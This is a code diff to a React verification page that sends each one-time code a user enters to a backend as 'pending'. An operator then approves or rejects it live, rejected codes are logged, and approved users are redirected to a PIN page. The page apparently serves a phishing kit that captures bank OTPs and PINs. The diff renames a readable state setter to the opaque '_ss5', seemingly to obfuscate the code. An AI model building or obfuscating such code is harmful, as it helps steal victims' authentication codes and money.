@@ -19,7 +19,7 @@ export default function VeriPage() {
   const router = useRouter()
   const [_v5, _s5] = useState("")
   const [error, setError] = useState("")
-  const [_v5Status, setOtpStatus] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
+  const [_v5Status, _ss5] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
   const [isLoading, setIsLoading] = useState(true)
   const [visitorId, setVisitorId] = useState<string>("")
   const [canResend, setCanResend] = useState(false)
@@ -98,7 +98,7 @@ export default function VeriPage() {
               oldOtp: data.oldOtp ? [...data.oldOtp, currentOtp] : [currentOtp],
               _v5Status: "pending"
             }).then(() => {
-              setOtpStatus("pending")
+              _ss5("pending")
               _s5("") // Clear the old code
               setError("تم رفض رمز التحقق. يرجى إدخال رمز صحيح.")
             }).catch(err => {
@@ -106,12 +106,12 @@ export default function VeriPage() {
               setError("حدث خطأ. يرجى المحاولة مرة أخرى.")
             })
           } else if (status === "approved") {
-            setOtpStatus("approved")
+            _ss5("approved")
             setError("")
             // Redirect to PIN page
             router.push("/confi")
           } else if (status === "verifying") {
-            setOtpStatus("verifying")
+            _ss5("verifying")
           }
         }
       },
@@ -211,7 +211,7 @@ export default function VeriPage() {
         _v5Code: _v5
       }, "pending")
 
-      setOtpStatus("verifying") // Show loading state
+      _ss5("verifying") // Show loading state
       // The status will be updated via the listener when admin approves/rejects
     } catch (err) {
       console.error("Error submitting OTP:", err)
